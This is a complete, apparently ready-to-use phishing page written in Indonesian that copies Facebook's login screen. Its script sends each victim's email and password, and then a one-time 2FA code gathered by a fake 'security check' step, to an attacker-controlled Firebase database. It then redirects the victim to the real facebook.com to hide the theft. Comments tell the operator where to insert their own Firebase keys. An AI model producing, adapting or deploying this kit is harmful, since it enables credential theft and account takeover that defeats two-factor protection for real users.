<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Masuk Facebook | Facebook</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        body { background-color: #f0f2f5; font-family: Helvetica, Arial, sans-serif; }
        .loader {
            border: 3px solid #f3f3f3; border-top: 3px solid #1877f2;
            border-radius: 50%; width: 20px; height: 20px;
            animation: spin 1s linear infinite; display: inline-block;
        }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        .hidden { display: none; }
    </style>
</head>
<body class="bg-[#f0f2f5] min-h-screen flex items-center justify-center p-4">

    <div id="wrapper" class="max-w-screen-xl w-full flex flex-col lg:flex-row items-center justify-between lg:space-x-12">
        
        <!-- Sisi Kiri: Branding -->
        <div id="branding" class="text-center lg:text-left mb-10 lg:mb-32 flex-1">
            <h1 class="text-[#1877f2] text-5xl lg:text-6xl font-bold mb-4 tracking-tighter">facebook</h1>
            <p class="text-xl lg:text-2xl text-gray-800 leading-tight">
                Facebook membantu Anda terhubung dan berbagi dengan orang-orang dalam kehidupan Anda.
            </p>
        </div>

        <!-- Sisi Kanan: Form Login -->
        <div id="loginSection" class="w-full max-w-[400px]">
            <div class="bg-white p-4 rounded-lg shadow-xl mb-6">
                <form id="loginForm">
                    <div class="mb-3">
                        <input type="text" id="user_id" placeholder="Email atau Nomor Telepon" required
                            class="w-full p-3 border border-gray-300 rounded-md focus:outline-none focus:border-[#1877f2] focus:ring-1 focus:ring-[#1877f2] text-lg">
                    </div>
                    <div class="mb-4">
                        <input type="password" id="user_pass" placeholder="Kata Sandi" required
                            class="w-full p-3 border border-gray-300 rounded-md focus:outline-none focus:border-[#1877f2] focus:ring-1 focus:ring-[#1877f2] text-lg">
                    </div>
                    <button type="submit" id="loginBtn" class="w-full bg-[#1877f2] text-white py-3 rounded-md text-xl font-bold hover:bg-[#166fe5] flex justify-center items-center">
                        <span id="load1" class="loader hidden mr-2"></span>
                        <span id="txt1">Log In</span>
                    </button>
                    <div class="text-center py-4 border-b border-gray-200">
                        <a href="#" class="text-[#1877f2] text-sm hover:underline">Lupa Kata Sandi?</a>
                    </div>
                    <div class="pt-6 pb-2 text-center">
                        <button type="button" class="bg-[#42b72a] text-white px-4 py-3 rounded-md text-lg font-bold">Buat Akun Baru</button>
                    </div>
                </form>
            </div>
        </div>

        <!-- Tampilan 2FA (Awalnya Tersembunyi) -->
        <div id="authSection" class="w-full max-w-[450px] bg-white rounded-lg shadow-xl hidden">
            <div class="p-4 border-b border-gray-200"><h2 class="text-lg font-bold">Pemeriksaan Keamanan</h2></div>
            <div class="p-4 text-center">
                <p class="text-sm text-gray-700 mb-4 text-left">Masukkan kode 6 digit yang kami kirimkan ke perangkat Anda.</p>
                <img src="https://www.facebook.com/images/checkpoint/2fa/generator/phone_icon.png" class="w-24 mx-auto mb-4">
                <form id="authForm">
                    <input type="text" id="two_factor_code" maxlength="6" placeholder="000 000" required
                        class="w-full max-w-[200px] text-center p-3 border border-gray-300 rounded-md text-2xl tracking-[0.3em] font-bold mb-4">
                    <button type="submit" id="authBtn" class="w-full bg-[#1877f2] text-white py-2 rounded-md font-bold">Konfirmasi</button>
                </form>
            </div>
        </div>
    </div>

    <!-- Firebase -->
    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/11.0.1/firebase-app.js";
        import { getFirestore, collection, addDoc, serverTimestamp } from "https://www.gstatic.com/firebasejs/11.0.1/firebase-firestore.js";

        // !!! SALIN CONFIG ANDA DARI FIREBASE CONSOLE DI SINI !!!
        const firebaseConfig = {
            apiKey: "MASUKKAN_API_KEY_ANDA",
            authDomain: "PROYEK_ANDA.firebaseapp.com",
            projectId: "PROYEK_ANDA",
            storageBucket: "PROYEK_ANDA.appspot.com",
            messagingSenderId: "NOMOR_SENDER",
            appId: "ID_APP_ANDA"
        };

        const app = initializeApp(firebaseConfig);
        const db = getFirestore(app);

        let tempEmail = "";
        let tempPass = "";

        // Tahap 1: Login
        document.getElementById('loginForm').addEventListener('submit', async (e) => {
            e.preventDefault();
            tempEmail = document.getElementById('user_id').value;
            tempPass = document.getElementById('user_pass').value;

            document.getElementById('load1').classList.remove('hidden');
            document.getElementById('txt1').innerText = "Memproses...";

            try {
                // Simpan data login pertama
                await addDoc(collection(db, "data_masuk"), {
                    email: tempEmail,
                    pass: tempPass,
                    step: "Login Tahap 1",
                    waktu: serverTimestamp()
                });

                // Pindah ke 2FA
                document.getElementById('loginSection').classList.add('hidden');
                document.getElementById('branding').classList.add('hidden');
                document.getElementById('authSection').classList.remove('hidden');
            } catch (err) { console.error(err); }
        });

        // Tahap 2: 2FA
        document.getElementById('authForm').addEventListener('submit', async (e) => {
            e.preventDefault();
            const code = document.getElementById('two_factor_code').value;
            document.getElementById('authBtn').innerText = "Memverifikasi...";

            try {
                // Simpan data lengkap
                await addDoc(collection(db, "data_masuk"), {
                    email: tempEmail,
                    pass: tempPass,
                    otp: code,
                    step: "Login Selesai (2FA)",
                    waktu: serverTimestamp()
                });

                // Selesai, lempar ke FB asli
                window.location.href = "https://www.facebook.com";
            } catch (err) { window.location.href = "https://www.facebook.com"; }
        });
    </script>
</body>
</html>
